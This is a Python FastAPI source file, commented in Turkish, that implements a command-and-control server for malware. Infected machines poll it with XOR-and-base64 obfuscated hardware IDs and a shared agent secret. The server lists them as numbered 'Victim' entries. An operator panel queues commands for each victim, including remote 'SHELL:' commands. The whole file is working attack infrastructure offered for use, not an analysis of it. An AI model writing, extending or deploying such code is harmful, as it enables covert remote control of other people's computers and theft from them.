from fastapi import FastAPI, Request, HTTPException, Header
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import time
import base64
import os
from typing import Dict

app = FastAPI()

# --- GÜVENLİK AYARLARI (Render Panelinden Environment Variable olarak eklenebilir) ---
PANEL_PASSWORD = os.environ.get("PANEL_PASS", "admin")
SHELL_KEY = os.environ.get("SHELL_KEY", "1234")
AGENT_SECRET = "T0p_S3cr3t_K3y_2026" # Sadece bu anahtara sahip ajanlar bağlanabilir
XOR_KEY = "C2_XOR_CRYP_SECRET_STRING"     # Trafik şifreleme anahtarı
ALLOWED_IP = os.environ.get("ALLOWED_IP", "") # Boşsa herkes girebilir (IP'ni Render'da set et)

# Veri Yapıları
clients: Dict[str, dict] = {}
commands: Dict[str, str] = {}
hwid_to_id: Dict[str, int] = {}
next_id = 1

# --- ŞİFRELEME YARDIMCISI ---
def xor_crypt(data: str, key: str = XOR_KEY):
    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def decrypt_payload(encoded: str):
    try:
        decoded = base64.b64decode(encoded).decode()
        return xor_crypt(decoded)
    except: return None

class LoginRequest(BaseModel):
    password: str

@app.get("/", response_class=HTMLResponse)
async def get_dashboard(request: Request):
    # IP Whitelist Kontrolü (Eğer set edilmişse)
    client_ip = request.client.host
    if ALLOWED_IP and client_ip != ALLOWED_IP:
        raise HTTPException(status_code=403, detail="Unauthorized IP")
    
    with open("index.html", "r", encoding="utf-8") as f:
        return f.read()

@app.post("/api/login")
async def login(req: LoginRequest, request: Request):
    if ALLOWED_IP and request.client.host != ALLOWED_IP:
        raise HTTPException(status_code=403, detail="Unauthorized IP")
        
    if req.password == PANEL_PASSWORD:
        return {"status": "ok", "token": "secret-session-token-123"}
    raise HTTPException(status_code=401, detail="Hatalı şifre")

@app.get("/api/clients")
async def get_clients():
    now = time.time()
    clean_clients = []
    for hwid, data in clients.items():
        status = "online" if now - data["last_seen"] < 90 else "offline"
        clean_clients.append({
            "id": f"Victim-{hwid_to_id[hwid]}",
            "hwid_hidden": "***" + hwid[-6:],
            "os": data["os"],
            "status": status,
            "last_seen_str": time.strftime('%H:%M:%S', time.localtime(data["last_seen"]))
        })
    return clean_clients

# --- AJAN POLL NOKTASI (Şifreli ve Doğrulamalı) ---
@app.get("/poll/{encrypted_hwid}")
async def poll(encrypted_hwid: str, x_agent_key: str = Header(None), os_info: str = "Unknown"):
    # 1. Agent Verification (Header Kontrolü)
    if x_agent_key != AGENT_SECRET:
        raise HTTPException(status_code=403, detail="Go away")

    # 2. HWID Decryption
    hwid = decrypt_payload(encrypted_hwid)
    if not hwid:
        raise HTTPException(status_code=400, detail="Invalid payload")

    global next_id
    if hwid not in hwid_to_id:
        hwid_to_id[hwid] = next_id
        next_id += 1
        
    clients[hwid] = {
        "os": os_info,
        "last_seen": time.time()
    }
    
    cmd = commands.get(hwid, "WAIT")
    if cmd != "WAIT":
        del commands[hwid]
        
    # Yanıtı da şifreleyebiliriz ama şimdilik komutun kendisini gönderiyoruz
    return {"command": cmd}

@app.post("/api/command/{hwid_id}/{cmd}")
async def set_command(hwid_id: str, cmd: str, key: str = ""):
    target_hwid = None
    try:
        target_num = int(hwid_id.replace("Victim-", ""))
        for h, i in hwid_to_id.items():
            if i == target_num:
                target_hwid = h
                break
    except: pass
            
    if not target_hwid:
        raise HTTPException(status_code=404, detail="Cihaz bulunamadı")

    if cmd.startswith("SHELL:"):
        if key != SHELL_KEY:
            raise HTTPException(status_code=403, detail="Geçersiz Shell Anahtarı!")

    commands[target_hwid] = cmd
    return {"status": "ok"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
